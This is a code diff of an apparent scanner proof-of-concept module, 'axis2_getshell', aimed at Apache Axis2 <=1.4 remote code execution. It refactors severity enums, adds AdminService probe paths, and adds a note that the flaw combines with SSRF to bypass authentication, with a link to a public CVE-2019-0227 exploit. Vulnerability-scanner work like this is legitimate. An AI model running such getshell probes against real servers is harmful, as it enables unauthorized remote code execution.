@@ -4,7 +4,15 @@
 
 import re
 from lib.utils.connect import ClientSession
-from script import Script, SERVICE_PORT_MAP
+from lib.core.enums import VUL_LEVEL
+from lib.core.enums import VUL_TYPE
+from lib.core.enums import SERVICE_PORT_MAP
+from script import Script
+
+"""
+配合SSRF可绕过远程的身份认证
+https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2019-0227/CVE-2019-0227.py
+"""
 
 class POC(Script):
     def __init__(self, target=None):
@@ -12,8 +20,8 @@ class POC(Script):
         self.name = 'axis2_getshell'
         self.keyword = ['axis2']
         self.info = 'axis2 <=1.4 getshell'
-        self.type = 'rce'
-        self.level = 'high'
+        self.type = VUL_TYPE.RCE
+        self.level = VUL_LEVEL.HIGH
         Script.__init__(self, target=target, service_type=self.service_type)
 
     async def prove(self):
@@ -22,8 +30,10 @@ class POC(Script):
             path_list = list(set([
                 self.url_normpath(self.base_url, '/axis2/services/AdminService?wsdl'),
                 self.url_normpath(self.base_url, './services/AdminService?wsdl'),
+                self.url_normpath(self.base_url, './axis/services/AdminService?wsdl'),
                 self.url_normpath(self.url, './services/AdminService?wsdl'),
                 self.url_normpath(self.url, './axis2/services/AdminService?wsdl'),
+                self.url_normpath(self.url, './axis/services/AdminService?wsdl'),
             ]))
             async with ClientSession() as session:
                 for path in path_list:
